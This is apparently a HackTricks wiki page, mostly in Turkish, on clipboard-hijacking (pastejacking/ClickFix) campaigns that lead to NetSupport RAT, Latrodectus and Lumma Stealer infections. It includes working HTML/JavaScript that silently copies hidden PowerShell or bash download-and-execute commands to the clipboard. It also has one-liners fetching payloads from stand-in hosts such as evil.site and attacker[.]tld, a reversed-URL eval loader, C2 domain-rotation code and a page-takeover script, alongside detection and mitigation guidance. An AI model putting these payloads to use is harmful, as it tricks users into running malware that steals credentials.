# Clipboard Hijacking (Pastejacking) Attacks

{{#include ../../banners/hacktricks-training.md}}

> "Kendinizin kopyalamadığı hiçbir şeyi yapıştırmayın." – eski ama hâlâ geçerli bir tavsiye

## Genel Bakış

Clipboard hijacking – also known as *pastejacking* – kullanıcıların komutları incelemeden rutin olarak kopyala-yapıştır yapma alışkanlığından yararlanır. Kötü amaçlı bir web sayfası (veya Electron veya Desktop uygulama gibi herhangi bir JavaScript-çalıştırabilen ortam), programatik olarak saldırgan kontrollü metni sistem panosuna yerleştirir. Mağdurlar genellikle dikkatle hazırlanmış sosyal mühendislik talimatlarıyla **Win + R** (Çalıştır iletişim kutusu), **Win + X** (Hızlı Erişim / PowerShell) tuşlarına basmaları veya bir terminal açıp panodaki içeriği *yapıştırmaları* için teşvik edilir; bu yapıştırma işlemi derhal herhangi bir komutun çalıştırılmasına yol açar.

Çünkü **hiçbir dosya indirilmez ve hiçbir ek açılmaz**, bu teknik ekleri, makroları veya doğrudan komut yürütmeyi izleyen çoğu e-posta ve web içeriği güvenlik kontrolünü atlar. Bu nedenle saldırı, NetSupport RAT, Latrodectus loader veya Lumma Stealer gibi yaygın malware ailelerini dağıtan phishing kampanyalarında popülerdir.

## Zorunlu "Copy" düğmeleri ve gizli payload'lar (macOS tek satırlık komutlar)

Bazı macOS infostealers, installer sitelerini (ör. Homebrew) klonlar ve kullanıcıların sadece görünen metni seçememesi için **“Copy” düğmesinin kullanılmasını zorlar**. Pano girdisi beklenen installer komutunu ve eklenmiş bir Base64 payload'u içerir (ör. `...; echo <b64> | base64 -d | sh`), böylece tek bir yapıştırma her ikisini de çalıştırırken UI ek aşamayı gizler.

## JavaScript Proof-of-Concept
```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
navigator.clipboard.writeText(payload)
.then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```
Eski kampanyalar `document.execCommand('copy')` kullanıyordu, daha yenileri ise asenkron **Clipboard API** (`navigator.clipboard.writeText`)'e dayanıyor.

## ClickFix / ClearFake Akışı

1. Kullanıcı, typosquatted veya compromised bir siteyi ziyaret eder (ör. `docusign.sa[.]com`)
2. Enjekte edilen **ClearFake** JavaScript'i, clipboard'a Base64-encoded PowerShell tek satırı sessizce kaydeden `unsecuredCopyToClipboard()` yardımcı fonksiyonunu çağırır.
3. HTML talimatları kurbana şunu söyler: *“Press **Win + R**, komutu yapıştırın ve sorunu çözmek için Enter'a basın.”*
4. `powershell.exe` çalışır, meşru bir executable ile kötü amaçlı bir DLL içeren bir arşivi indirir (klasik DLL sideloading).
5. Loader ek aşamaları deşifre eder, shellcode enjekte eder ve persistence (ör. scheduled task) kurar – nihayetinde NetSupport RAT / Latrodectus / Lumma Stealer'ı çalıştırır.

### Örnek NetSupport RAT Zinciri
```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```
* `jp2launcher.exe` (meşru Java WebStart) dizininde `msvcp140.dll`'i arar.
* Kötü amaçlı DLL, API'leri **GetProcAddress** ile dinamik olarak çözer, iki ikili dosyayı (`data_3.bin`, `data_4.bin`) **curl.exe** aracılığıyla indirir, bunları rolling XOR anahtarı `"https://google.com/"` kullanarak çözer, final shellcode'u enjekte eder ve **client32.exe** (NetSupport RAT) dosyasını `C:\ProgramData\SecurityCheck_v1\` konumuna açar.

### Latrodectus Loader
```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```
1. `la.txt` dosyasını **curl.exe** ile indirir
2. JScript downloader'ı **cscript.exe** içinde çalıştırır
3. MSI payload'ı alır → imzalı bir uygulamanın yanına `libcef.dll` bırakır → DLL sideloading → shellcode → Latrodectus.

### Lumma Stealer aracılığıyla MSHTA
```
mshta https://iplogger.co/xxxx =+\\xxx
```
The **mshta** çağrısı gizli bir PowerShell betiği başlatır; bu betik `PartyContinued.exe`'yi alır, `Boat.pst` (CAB) dosyasını çıkarır, `extrac32` ve dosya birleştirmesi ile `AutoIt3.exe`'yi yeniden oluşturur ve son olarak bir `.a3x` betiği çalıştırarak tarayıcı kimlik bilgilerini `sumeriavgv.digital`'e dışa aktarır.

## ClickFix: Clipboard → PowerShell → JS eval → Startup LNK ile rotating C2 (PureHVNC)

Bazı ClickFix kampanyaları dosya indirmelerini tamamen atlar ve mağdurlara WSH aracılığıyla JavaScript'i alan ve çalıştıran, bunu kalıcı hale getiren ve C2'yi günlük olarak döndüren tek satırlık bir komutu yapıştırmalarını talimat verir. Gözlemlenen örnek zincir:
```powershell
powershell -c "$j=$env:TEMP+'\a.js';sc $j 'a=new
ActiveXObject(\"MSXML2.XMLHTTP\");a.open(\"GET\",\"63381ba/kcilc.ellrafdlucolc//:sptth\".split(\"\").reverse().join(\"\"),0);a.send();eval(a.responseText);';wscript $j" Prеss Entеr
```
Ana özellikler
- Yüzeysel incelemeyi engellemek için çalışma zamanında tersine çevrilen obfusk edilmiş URL.
- JavaScript, Startup LNK (WScript/CScript) aracılığıyla kalıcılık sağlar ve C2'yi mevcut güne göre seçer — hızlı alan adı döndürmeyi sağlar.

C2'leri tarihe göre döndürmek için kullanılan minimal JS parçacığı:
```js
function getURL() {
var C2_domain_list = ['stathub.quest','stategiq.quest','mktblend.monster','dsgnfwd.xyz','dndhub.xyz'];
var current_datetime = new Date().getTime();
var no_days = getDaysDiff(0, current_datetime);
return 'https://'
+ getListElement(C2_domain_list, no_days)
+ '/Y/?t=' + current_datetime
+ '&v=5&p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime);
}
```
Bir sonraki aşamada genellikle persistence sağlayan ve bir RAT (ör. PureHVNC) çeken bir loader dağıtılır; sıklıkla TLS'i hardcoded certificate'e pinleyip trafiği chunk'lar.

Detection ideas specific to this variant
- İşlem ağacı: `explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js` (veya `cscript.exe`).
- Başlangıç artifaktları: LNK in `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup` WScript/CScript'i `%TEMP%`/`%APPDATA%` altındaki bir JS yoluyla çağırıyor.
- Registry/RunMRU ve komut‑satırı telemetrisi içinde `.split('').reverse().join('')` veya `eval(a.responseText)` bulunması.
- Uzun komut satırları olmadan uzun scriptleri beslemek için büyük stdin payload'ları ile tekrar eden `powershell -NoProfile -NonInteractive -Command -`.
- Daha sonra LOLBins çalıştıran Scheduled Tasks, örn. updater‑görünümlü bir görev/yol altında `regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"` (ör., `\GoogleSystem\GoogleUpdater`).

Threat hunting
- Günlük dönen C2 host adları ve URL'ler, `.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>` pattern'iyle.
- Clipboard write event'larını, ardından Win+R yapıştırma ve hemen `powershell.exe` çalıştırılması ile korele edin.

Blue-teams can combine clipboard, process-creation and registry telemetry to pinpoint pastejacking abuse:

* Windows Registry: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` **Win + R** komutlarının geçmişini tutar – olağandışı Base64 / obfuscated girdilere bakın.
* Security Event ID **4688** (Process Creation) — `ParentImage` == `explorer.exe` ve `NewProcessName` { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` } içinde.
* Event ID **4663** — şüpheli 4688 olayından hemen önce `%LocalAppData%\Microsoft\Windows\WinX\` veya geçici klasörler altında dosya oluşturma girişleri için.
* EDR clipboard sensors (varsa) – `Clipboard Write` olayını hemen ardından gelen yeni bir PowerShell süreci ile korele edin.

## IUAM-style verification pages (ClickFix Generator): clipboard copy-to-console + OS-aware payloads

Son kampanyalar, kullanıcıları clipboard'larından OS-specific komutları native console'lara kopyalamaya zorlayan sahte CDN/browser doğrulama sayfalarını ("Just a moment…", IUAM-style) seri olarak üretiyor. Bu, yürütmeyi tarayıcı sandbox'ından çıkarır ve Windows ile macOS'ta çalışır.

Key traits of the builder-generated pages
- `navigator.userAgent` ile OS tespiti yapıp payload'ları (Windows PowerShell/CMD vs. macOS Terminal) uyarlama. Desteklenmeyen OS'ler için yanıltma/no-op'lar opsiyonel.
- Görünür metin clipboard içeriğinden farklı olabilse bile benign UI eylemleri (checkbox/Copy) ile otomatik clipboard-copy.
- Mobil engelleme ve adım adım talimat içeren bir popover: Windows → Win+R→paste→Enter; macOS → open Terminal→paste→Enter.
- Opsiyonel obfuscation ve single-file injector ile kompromize olmuş bir sitenin DOM'unu Tailwind-styled doğrulama UI ile overwrite etme (yeni domain kaydı gerektirmez).

Example: clipboard mismatch + OS-aware branching
```html
<div class="space-y-2">
<label class="inline-flex items-center space-x-2">
<input id="chk" type="checkbox" class="accent-blue-600"> <span>I am human</span>
</label>
<div id="tip" class="text-xs text-gray-500">If the copy fails, click the checkbox again.</div>
</div>
<script>
const ua = navigator.userAgent;
const isWin = ua.includes('Windows');
const isMac = /Mac|Macintosh|Mac OS X/.test(ua);
const psWin = `powershell -nop -w hidden -c "iwr -useb https://example[.]com/cv.bat|iex"`;
const shMac = `nohup bash -lc 'curl -fsSL https://example[.]com/p | base64 -d | bash' >/dev/null 2>&1 &`;
const shown = 'copy this: echo ok';            // benign-looking string on screen
const real = isWin ? psWin : (isMac ? shMac : 'echo ok');

function copyReal() {
// UI shows a harmless string, but clipboard gets the real command
navigator.clipboard.writeText(real).then(()=>{
document.getElementById('tip').textContent = 'Now press Win+R (or open Terminal on macOS), paste and hit Enter.';
});
}

document.getElementById('chk').addEventListener('click', copyReal);
</script>
```
macOS persistence of the initial run
- `nohup bash -lc '<fetch | base64 -d | bash>' >/dev/null 2>&1 &` kullanın; böylece terminal kapandıktan sonra yürütme devam eder ve görünür artefaktlar azalır.

In-place page takeover on compromised sites
```html
<script>
(async () => {
const html = await (await fetch('https://attacker[.]tld/clickfix.html')).text();
document.documentElement.innerHTML = html;                 // overwrite DOM
const s = document.createElement('script');
s.src = 'https://cdn.tailwindcss.com';                     // apply Tailwind styles
document.head.appendChild(s);
})();
</script>
```
IUAM-tarzı tuzaklara özgü tespit ve avlama fikirleri
- Web: Clipboard API'yi doğrulama widget'larına bağlayan sayfalar; görüntülenen metin ile clipboard payload arasındaki uyuşmazlık; `navigator.userAgent` dallanması; şüpheli bağlamlarda Tailwind + single-page replace.
- Windows endpoint: `explorer.exe` → `powershell.exe`/`cmd.exe` tarayıcı etkileşiminden kısa süre sonra; `%TEMP%`'ten çalıştırılan batch/MSI installer'lar.
- macOS endpoint: Tarayıcı olaylarına yakın zamanda Terminal/iTerm'in `bash`/`curl`/`base64 -d` ile `nohup` kullanarak süreç başlatması; terminal kapandıktan sonra da devam eden arkaplan işleri.
- `RunMRU` Win+R geçmişi ve clipboard yazmalarını sonraki konsol süreç oluşturmayla ilişkilendirin.

See also for supporting techniques

{{#ref}}
clone-a-website.md
{{#endref}}

{{#ref}}
homograph-attacks.md
{{#endref}}

## Önlemler

1. Tarayıcı sertleştirmesi – clipboard yazma erişimini devre dışı bırakın (`dom.events.asyncClipboard.clipboardItem` vb.) veya kullanıcı etkileşimi gerektirin.
2. Güvenlik farkındalığı – kullanıcılara hassas komutları *yazmalarını* ya da önce bir metin editörüne yapıştırmalarını öğretin.
3. PowerShell Constrained Language Mode / Execution Policy + Application Control ile rastgele one-liner'ları engelleyin.
4. Ağ kontrolleri – bilinen pastejacking ve malware C2 domain'lerine giden outbound istekleri engelleyin.

## İlgili Hileler

* **Discord Invite Hijacking** genellikle kullanıcıları kötü amaçlı bir sunucuya çekip sonra aynı ClickFix yaklaşımını kötüye kullanır:

{{#ref}}
discord-invite-hijacking.md
{{#endref}}

## References

- [Fix the Click: Preventing the ClickFix Attack Vector](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)
- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [The ClickFix Factory: First Exposure of IUAM ClickFix Generator](https://unit42.paloaltonetworks.com/clickfix-generator-first-of-its-kind/)
- [2025, the year of the Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)

{{#include ../../banners/hacktricks-training.md}}
